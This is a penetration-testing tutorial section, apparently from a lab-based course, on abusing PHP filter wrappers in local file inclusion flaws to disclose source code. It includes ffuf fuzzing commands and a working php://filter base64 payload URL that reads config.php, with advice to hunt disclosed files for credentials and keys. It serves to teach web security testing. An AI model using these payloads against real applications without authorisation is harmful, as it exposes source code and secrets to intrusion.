# PHP Filters

Many popular web applications are developed in PHP, along with various custom web applications built with frameworks like Laravel or Symfony. If we identify an LFI vulnerability in a PHP web application, we can use different PHP wrappers to extend LFI exploitation and potentially reach remote code execution.

PHP wrappers allow access to different I/O streams at the application level, such as standard input/output, file descriptors, and memory streams. While this is useful for developers, penetration testers can also use wrappers to read PHP source code files or even execute system commands. This is valuable not only for LFI attacks, but also for other web attacks like XXE.

In this section, we focus on basic PHP filters for source code disclosure. In the next section, we cover wrappers that can help achieve RCE through LFI vulnerabilities.

## Input Filters

PHP Filters are a type of PHP wrapper where input can be processed through a specified filter.

- Wrapper scheme: `php://`
- Filter wrapper: `php://filter/`

The main parameters used in this attack path are:

- `resource`: required; specifies the stream/resource to apply the filter to (e.g., a local file)
- `read`: applies a chosen filter when reading the resource

Four filter categories are available:

1. String Filters
2. Conversion Filters
3. Compression Filters
4. Encryption Filters

For LFI source disclosure, the key filter is `convert.base64-encode` (Conversion Filters).

## Fuzzing for PHP Files

First, enumerate available PHP pages with tools like `ffuf` or `gobuster`:

```shellsession
Debl3x@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

> **Tip:** With LFI, do not limit findings to HTTP `200` only. Include `301`, `302`, and `403`, since their source may still be readable.

After identifying files, inspect their source for references to additional PHP files and continue recursively. You can start from `index.php`, but fuzzing often reveals files that simple reference-following misses.

## Standard PHP Inclusion

When including PHP files via LFI, the included file is usually executed and rendered as HTML output.

Example:

```http
http://<SERVER_IP>:<PORT>/index.php?language=config
```

In many cases, this returns little or no visible output (e.g., `config.php` may only define settings).

This behavior can still be useful (e.g., local-only PHP page access), but in most cases we want the raw PHP source. Using the base64 filter solves this by encoding source code instead of executing it.

This is especially useful when the application automatically appends `.php`, restricting inclusion to PHP files.

> **Note:** The same concept applies to non-PHP apps if the vulnerable function executes files. If execution does not occur, source may be returned directly without extra filters.

## Source Code Disclosure

Once you have candidate PHP files, disclose source with the base64 filter.

To read `config.php`:

```url
php://filter/read=convert.base64-encode/resource=config
```

```http
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

> **Note:** `resource=config` is intentional if the app appends `.php`, resulting in `config.php`.

Unlike regular LFI inclusion, this returns base64-encoded content. Decode it locally:

```shellsession
Debl3x@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

> **Tip:** Copy the full base64 string. If it is truncated, decoding fails or returns incomplete code. Checking page source helps ensure the full value is copied.

You can then review disclosed files for sensitive data (credentials, keys, internal paths) and continue mapping additional references.
